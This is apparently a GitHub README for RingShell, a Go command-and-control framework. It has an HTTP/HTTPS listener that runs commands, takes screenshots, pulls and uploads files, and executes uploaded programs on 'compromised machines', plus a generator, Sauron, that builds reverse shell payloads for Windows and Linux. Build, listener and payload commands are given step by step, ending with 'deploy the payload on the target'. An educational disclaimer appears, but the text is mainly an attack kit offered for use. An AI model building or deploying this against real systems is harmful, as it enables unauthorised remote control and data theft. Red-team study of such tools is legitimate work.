# RingShell
![RingShell](https://github.com/MustafaAbdulazizHamza/RingShell/blob/main/ringShell.png)
---

**RingShell** is a lightweight **Command and Control (C2)** framework written in **Golang**, provided for **educational purposes** in offensive security.  
It supports HTTP/HTTPS-based communication with reverse shell payloads and can be extended with user-developed payloads.

RingShell consists of two main components:

1. **Listener** – An HTTP/HTTPS server that interacts with compromised machines, enabling shell access and file operations.
2. **Payload Generator (Sauron)** – Generates platform-specific reverse shell payloads using user-supplied network and system details.

---

## 🛰️ RingShell Listener

A Golang-based interactive interface that enables users to:

- **Manage sessions** with compromised machines:
  - Execute arbitrary commands
  - Upload/download files
  - Take screenshots
  - Retrieve specific files and images

- **HTTP/HTTPS communication** with optional self-signed certificate generation

- **Use scripting** to automate interactions using pre-written RingShell command files

### Listener Commands

| Command | Description |
|---------|-------------|
| `bind listening <port> named <name>` | Start a TCP listener for data exfiltration |
| `bind controlling <port> named <name>` | Start a TCP server for broadcasting commands |
| `list sessions` | List all active sessions |
| `list servers listening` | List all listening servers |
| `list servers controlling` | List all controlling servers |
| `listen <session_id>` | Select a session to interact with |
| `set output <path>` | Set output directory for downloaded files |
| `get file <filepath>` | Download file(s) from the target |
| `get image <filepath>` | Download image(s) from the target |
| `get screenshots` | Capture and download screenshots |
| `upload file <filepath>` | Upload file(s) to the target |
| `upload executable <filepath>` | Upload and execute file(s) on the target |
| `import <script.rsh>` | Execute a RingShell script |
| `kill <server_name>` | Terminate a server |
| `q!` | Exit the shell |

### Listener Flags

| Flag | Description |
|------|-------------|
| `--port` | HTTP server port (default: 8080) |
| `--https` | Enable HTTPS mode |
| `--cert` | Path to TLS certificate file |
| `--key` | Path to TLS key file |

If `--https` is enabled without `--cert` and `--key`, the listener will generate a self-signed certificate automatically.

---

## 🛠️ Sauron: The Payload Generator

**Sauron** is a command-line tool that creates reverse shell payloads based on:

- Listener IP and Port
- Target OS and architecture
- Communication protocol (HTTP/HTTPS)
- TLS verification settings

### Sauron Flags

| Flag | Description |
|------|-------------|
| `-ip` | Listener IP address (required) |
| `-port` | Listener port number (required) |
| `-os` | Target operating system (required) |
| `-arch` | Target architecture (required) |
| `-out` | Output directory for the payload (required) |
| `-https` | Use HTTPS for communication |
| `-secure` | Enable TLS certificate verification (for valid certificates) |

### Examples

```bash
./sauron -ip 192.168.1.10 -port 8080 -os windows -arch amd64 -out ./output
./sauron -ip 192.168.1.10 -port 443 -os linux -arch amd64 -https -out ./output
./sauron -ip 192.168.1.10 -port 443 -os windows -arch amd64 -https -secure -out ./output
```

---

## 📦 Prerequisites
- Linux Machine
- [Golang](https://golang.org/dl/)

---

## 🚀 Getting Started

1. **Clone the repository:**

```bash
git clone https://github.com/MustafaAbdulazizHamza/RingShell.git
```

2. **Build the components:**

```bash
cd RingShell/RingShell
go build -o ringshell .

cd ../Sauron
go build -o sauron .
```

3. **Start the listener:**

```bash
./ringshell --port 8080
./ringshell --port 443 --https
./ringshell --port 443 --https --cert server.crt --key server.key
```

4. **Generate a payload:**

```bash
./sauron -ip <LISTENER_IP> -port <LISTENER_PORT> -os <TARGET_OS> -arch <TARGET_ARCH> -out ./output
```

5. **Deploy the payload** on the target system and interact via the listener.

---

## ⚠️ Disclaimer
- This project is intended for educational and research purposes only.

- The developers are not responsible for any misuse or damage caused by this tool.
